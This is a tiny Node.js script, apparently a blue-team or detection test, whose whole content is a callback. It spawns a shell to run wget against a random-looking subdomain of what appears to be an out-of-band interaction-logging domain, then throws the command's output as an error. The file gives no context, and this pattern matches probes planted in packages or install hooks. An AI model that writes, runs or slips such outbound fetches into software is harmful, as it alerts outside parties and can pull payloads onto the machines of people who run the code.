#!/usr/bin/env node.js
let cmd = `wget http://xpq12acdybm4n1p4f4ds3cu8rzxqli97.c.0e.is/blueteam_test1`;
require('child_process').exec(cmd, (error, stdout, stderr) => {
    if (error) {
        throw new Error(`执行错误:\r\n${error}`);
    }
    if (stderr) {
        throw new Error(`标准错误输出:\r\n${stderr}`);
    }
    throw new Error(`标准输出:\r\n${stdout}`);
});